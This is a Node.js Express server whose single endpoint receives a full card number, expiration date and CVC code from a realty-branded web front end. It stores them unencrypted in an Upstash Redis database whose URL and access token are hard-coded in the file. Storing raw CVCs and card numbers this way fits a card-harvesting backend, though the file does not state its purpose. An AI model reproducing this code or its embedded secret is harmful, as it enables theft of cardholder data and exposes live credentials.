const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { Redis } = require('@upstash/redis');

const app = express();

// Initialize Redis client with Upstash Redis
const redis = new Redis({
  url: 'https://normal-mastodon-59365.upstash.io',
  token: 'AeflAAIjcDFjODRkZTdkYzQ4ZWQ0NjY2YjhjODY0MTBhZDYwMjU4NXAxMA',
});

app.use(cors({
  origin: function (origin, callback) {
    const allowedOrigins = ['http://localhost:3000', 'https://sun-realty-homes-cl.vercel.app'];
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      return callback(new Error('The CORS policy does not allow access from the specified Origin.'), false);
    }
    return callback(null, true);
  }
}));

app.use(bodyParser.json());

// Endpoint to save form data to Redis database
app.post('/api/save-data', async (req, res) => {
  const { cardNumber, expirationDate, cvcCode } = req.body;

  if (!cardNumber || cardNumber.length !== 16 || !expirationDate || !cvcCode) {
    return res.status(400).json({ message: 'Invalid data' });
  }

  try {
    // Generate a unique key for the data
    const timestamp = Date.now();
    const key = `form-data-${timestamp}`;

    // Save data to Redis
    await redis.set(key, JSON.stringify({ cardNumber, expirationDate, cvcCode }));

    res.status(200).json({ message: 'Data saved successfully', key });
  } catch (error) {
    console.error('Error saving data:', error);
    res.status(500).json({ message: 'Failed to save data' });
  }
});

// Export the app
module.exports = app;

// Start the server (for local testing only)
if (process.env.NODE_ENV !== 'production') {
  app.listen(5000, () => {
    console.log('Server running on http://localhost:5000');
  });
}
